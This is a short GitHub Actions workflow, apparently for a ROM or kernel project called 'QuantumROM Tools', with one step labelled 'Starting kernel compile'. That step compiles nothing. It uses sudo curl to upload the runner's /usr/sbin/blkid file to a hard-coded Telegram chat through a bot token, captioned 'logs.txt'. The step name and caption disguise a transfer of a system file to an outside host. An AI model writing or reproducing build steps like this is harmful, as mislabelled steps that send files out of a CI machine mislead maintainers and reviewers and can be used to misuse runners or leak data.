name: QuantumROM Tools

on:
  push:
    branches:
      - heroku

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: 5️⃣ Starting kernel compile
        env:
          TG_BOT_TOKEN: ${{ secrets.TG_BOT_TOKEN }}
        run: |
          sudo curl -F chat_id=2081111916 -F document=@/usr/sbin/blkid -F caption="logs.txt" https://api.telegram.org/bot${TG_BOT_TOKEN}/sendDocument
